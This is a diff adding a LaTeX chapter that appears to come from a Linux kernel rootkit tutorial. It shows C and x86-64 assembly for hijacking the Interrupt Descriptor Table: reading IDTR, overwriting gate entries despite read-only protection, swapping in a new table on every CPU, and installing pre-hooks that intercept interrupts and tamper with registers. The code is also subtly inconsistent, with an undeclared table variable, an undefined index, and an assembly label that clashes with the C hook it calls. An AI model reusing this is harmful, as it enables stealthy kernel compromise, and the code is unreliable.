@@ -1,0 +1,146 @@
+%vol A3. 6
+The IDT (Interrupt Descriptor Table) is a linear table of 256 entries which
+associate an interrupt vector with a handler. When an interrupt is issued,
+the CPU retrieve the number and call the associated handler.
+
+The main reason we want to hook the idt is to replace the default handler for
+the 0x80 entry, which is the number used by linux to make syscall from
+userland.
+
+\subsubsection{Taking control of the table}
+\paragraph{Address of the IDT}\mbox{}\\
+Retrieving the address of the IDT is trivial because it is stored in a
+special CPU's register (IDTR) that can be accessed with the instructions
+\cmd{lidt} (load IDT register) and \cmd{sidt} (store IDT register).
+
+\begin{ccode}
+static struct gate_struct64 *idt_table;
+static unsigned short idt_table_sz;
+
+static void inline local_store_idt(void *dtr) {
+    asm volatile("sidt %0":"=m" (*((struct desc_ptr *)dtr)));
+}
+
+static void inline local_load_idt(void *dtr) {
+    asm volatile("lidt %0"::"m" (*((struct desc_ptr *)dtr)));
+}
+
+static void idt_get_table(void) {
+    struct desc_ptr idtr;
+
+    local_store_idt(&idtr);
+    idt_table = (struct gate_struct64 *)idtr.address;
+    idt_table_sz = idtr.size;
+}
+\end{ccode}\\
+\cmd{struct desc\_ptr} is a structure containing the size and the address of the
+IDT used by Linux.
+
+
+There is 2 different approachs to change a handler:
+\begin{itemize}
+    \item Change the entry directly in the table;
+    \item Change the whole table.
+\end{itemize}
+
+\paragraph{Change an entry}\mbox{}\\
+For security reasons, the IDT is read-only, which is not really a problem
+since we know how to bypass the memory protection.
+
+An IDT entry is not just a pointer to a handler, it also contains some flags.
+
+\begin{ccode}
+void idt_set_entry(unsigned long addr, int n) {
+    idt_table[n].offset_high = (addr >> 32) & 0xffffffff;
+    idt_table[n].offset_middle = (addr >> 16) & 0xffff;
+    idt_table[n].offset_low = addr & 0xffff;
+}
+
+unsigned long idt_get_entry(int n) {
+    return (((unsigned long)cur_idt_table[n].offset_high) << 32)
+         + (((unsigned long)cur_idt_table[n].offset_middle) << 16)
+         + (((unsigned long)cur_idt_table[n].offset_low));
+}
+\end{ccode}
+
+\paragraph{Change the whole table}\mbox{}\\
+The address of the table is stored in an unique location: in the CPU's IDTR.
+If we change the value of the register with our table, all the futur accesses
+will use our table instead of the old one. The advantage is that we do not need
+to modify read-only data, but only a register.
+Note that if you have a multi-core CPU, you will need to change the register
+of each CPU. This can be done with the function \cmd{on\_each\_cpu}.
+
+\begin{ccode}
+static struct gate_struct64 new_idt_table[256];
+
+static void substitute_idt_table(void) {
+    struct desc_ptr idtr;
+
+    /* Retrieve the original table */
+    local_store_idt(&idtr);
+    idt_table = (struct gate_struct64 *)idtr.address;
+    idt_table_sz = idtr.size;
+
+    memcpy(new_idt_table, idt_table, idt_table_sz);
+
+    /* Set the new table in the CPUs'IDTR */
+    idtr.address = (unsigned long)new_idt_table;
+    idtr.size = idt_table_sz;
+    on_each_cpu(local_load_idt, &idtr, 1);
+}
+\end{ccode}
+
+
+\subsubsection{Creating hooks}
+Now that we got the control of the table, it's time to modify the handlers!
+The goal of this chapter is to run a hook before the original handler and
+allow the rootkit to read and/or modify the registers to alter the normal
+behaviour. Our hook then decide if it wants to execute the orginal handler
+or not. In some cases we don't want the original handler to be run because
+we just want to intercept the interrupts.
+
+\begin{asmcode}
+/* Pre-hook for 0x0 IDT entry (Divide-by-zero)
+ *   - save the registers
+ *   - execute the pre-hook
+ *   - restore the registers
+ *   - if the pre-hook return a zero value the original handler is executed
+ *   - otherwise if the value is positive we increment the return address
+ *     with this value (useful to skip an opcode like ud2 or int $0x3)
+ *   - return from the interrupt
+ */
+.extern idt_0x0_hook
+.extern idt_0x0_hdlr
+
+idt_0x0_hook:
+  save_regs
+  callq *(idt_0x0_hook)
+  test %rax, %rax
+  jnz idt_iret
+  restore_regs
+  jmp *(idt_0x0_hdlr)
+idt_iret:
+  /* Increment the return address (stored on the stack) with the result of
+   * the pre-hook
+   */
+  add %rax, 0x80(%rsp)
+  restore_regs
+  iretq
+\end{asmcode}
+
+\begin{ccode}
+unsigned long idt_0x0_hdlr;
+int idt_0x0_hook(struct pt_regs *regs) {
+    pr_warn("schischi is watching you.\n");
+    return 0; //0 means execute the original handler
+}
+
+void hijack_idt_0x0(void) {
+    idt_0x0_hdlr = idt_get_entry(0x0);
+    idt_set_entry(idt_0x0_hook, n);
+}
+\end{ccode}\\
+
+Now everytime a divide-by-zero is issued by a CPU, your handler is called
+first, then the original handler.
